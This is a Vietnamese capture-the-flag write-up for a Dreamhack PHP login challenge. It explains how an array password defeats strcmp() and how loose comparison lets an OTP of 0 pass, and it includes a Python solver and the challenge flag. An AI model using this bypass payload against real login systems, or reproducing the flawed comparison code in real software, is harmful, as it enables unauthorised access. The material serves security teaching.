## Challenge: easy-login
### Information
Hãy đăng nhập với tư cách quản trị viên (administrator) và giành lấy flag!  
Định dạng flag là DH{...}.
### Solution
**index.php**
```php
<?php

function generatePassword($length) {
    $characters = '0123456789abcdef';
    $charactersLength = strlen($characters);
    $pw = '';
    for ($i = 0; $i < $length; $i++) {
        $pw .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $pw;
}

function generateOTP() {
    return 'P' . str_pad(strval(random_int(0, 999999)), 6, "0", STR_PAD_LEFT);
}

$admin_pw = generatePassword(32);
$otp = generateOTP();

function login() {
    if (!isset($_POST['cred'])) {
        echo "Please login...";
        return;
    }

    if (!($cred = base64_decode($_POST['cred']))) {
        echo "Cred error";
        return;
    }

    if (!($cred = json_decode($cred, true))) {
        echo "Cred error";
        return;
    }

    if (!(isset($cred['id']) && isset($cred['pw']) && isset($cred['otp']))) {
        echo "Cred error";
        return;
    }

    if ($cred['id'] != 'admin') {
        echo "Hello," . $cred['id'];
        return;
    }
    
    if ($cred['otp'] != $GLOBALS['otp']) {
        echo "OTP fail";
        return;
    }

    if (!strcmp($cred['pw'], $GLOBALS['admin_pw'])) {
        require_once('flag.php');
        echo "Hello, admin! get the flag: " . $flag;
        return;
    }

    echo "Password fail";
    return;
}

?>

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>Easy Login</title>
</head>
<body>
    <div class="login-container">
        <h2>Login as admin to get flag<h2>
        <form action="login.php" method="post">
            <div class="form-group">
                <label for="id">ID</label>
                <input type="text" name="id"></br>
            </div>
            <div class="form-group">
                <label for="pw">PW</label>
                <input type="text" name="pw"></br>
            </div>
            <div class="form-group">
                <label for="otp">OTP</label>
                <input type="text" name="otp"></br>
            </div>
            <button type="submit" class="button">Login</button>
        </form>
        <div class="message">
            <?php login(); ?>
        </div>
    </div>
</body>
</html>
```

**login.php**
```php
<form id="redir" action="index.php" method="post">
    <?php
    $a = array();
    foreach ($_POST as $k => $v) {
        $a[$k] = $v;
    }

    $j = json_encode($a);
    echo '<input type="hidden" name="cred" value="' . base64_encode($j) . '">';
    ?>
</form>

<script type="text/javascript">
    document.getElementById('redir').submit();
</script>
```

**flag.php**
```php
<?php
$flag = "testflag";
?>
```

#### Phân tích: ` if (!strcmp($cred['pw'], $GLOBALS['admin_pw']))`
`strcmp()` được thiết kế để so sánh hai chuỗi. Do đó nếu đưa cho nó một mảng, `strcmp()` sẽ bị lỗi, trả về `NULL`
Khi đó:
- `strcmp([], "random_password")` ➔ NULL
- `!NULL` ➔ true

===> Ta sẽ gửi `pw: []` để `if (true)` luôn đúng và vượt qua phần kiểm tra password.  

#### Phân tích: `if ($cred['otp'] != $GLOBALS['otp'])`
```python
function generateOTP() {
    return 'P' . str_pad(strval(random_int(0, 999999)), 6, "0", STR_PAD_LEFT);
}
```

===> OTP luôn bắt đầu bằng chữ **P**  

Với phép so sánh `!=`, khi so sánh một số với một chuỗi bắt đầu bằng chữ, nó sẽ ép chuỗi đó về **0**  
Khi đó:
- Ta gửi `otp: 0`
- Server so sánh: `0 != "P123456"`  <=>  `0 != 0`
- Kết quả là `false`
  
===> `if` không được thực thi, vượt qua phần kiểm tra OTP.
  
Tạo file `solver.py` để thực thi kế hoạch trên
```python
import requests
import json
import base64

url = "http://host8.dreamhack.games:11388/"
payload = {"id":"admin","pw":[],"otp":0}
cred = base64.b64encode(json.dumps(payload).encode()).decode()
response = requests.post(url, data={"cred": cred})
print(response.text)
```

Dùng cmd để chạy code và ta có được flag: `DH{85256d8e59d3603651c9053572506e088d8a953e0faa59f769afd1745b09a618}`
